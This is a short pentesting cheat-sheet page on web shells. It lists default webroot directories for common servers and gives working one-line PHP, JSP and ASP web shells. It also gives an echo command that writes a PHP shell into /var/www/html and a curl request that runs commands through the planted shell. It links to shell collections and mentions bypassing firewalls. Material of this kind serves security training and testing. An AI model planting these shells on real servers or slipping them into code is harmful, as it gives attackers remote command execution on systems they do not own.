---
layout: default
title: Web shells
permalink: /web_shells/
---

# Web Shell
A Web Shell is typically a web script, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.
We need to place our web shell script into the remote host's web directory (webroot) to execute the script. This can be through a vulnerability.
<!--
| Web Server | Default Webroot           |
|------------|---------------------------|
| Apache     | `/var/www/html/`          |
| Nginx      | `/usr/local/nginx/html/`  |
| IIS        | `c:\inetpub\wwwroot\`     |
| XAMPP      | `C:\xampp\htdocs\`        |
-->
<table>
  <thead>
    <tr>
      <th>Web Server</th>
      <th>Default Webroot</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Apache</td>
      <td><code>/var/www/html/</code></td>
    </tr>
    <tr>
      <td>Nginx</td>
      <td><code>/usr/local/nginx/html/</code></td>
    </tr>
    <tr>
      <td>IIS</td>
      <td><code>c:\inetpub\wwwroot\</code></td>
    </tr>
    <tr>
      <td>XAMPP</td>
      <td><code>C:\xampp\htdocs\</code></td>
    </tr>
  </tbody>
</table>
We can check these directories to see which webroot is in use and then use echo to write out our web shell. <br>

[SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) provides a plethora of web shells for different frameworks and languages. <br>

*Note: In certain cases, web shells may not work. This may be due to the web server preventing the use of some functions utilized by the web shell (e.g. system()), or due to a Web Application Firewall, among other reasons. In these cases, we may need to use advanced techniques to bypass these security mitigations.*

## PHP

```
<?php system($_REQUEST["cmd"]); ?>
```
```
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
Accessing the web shell:
```
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

One good option for PHP is [phpbash](https://github.com/Arrexel/phpbash), which provides a terminal-like, semi-interactive web shell. 

## JSP

```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## ASP

```
<% eval request("cmd") %>
```




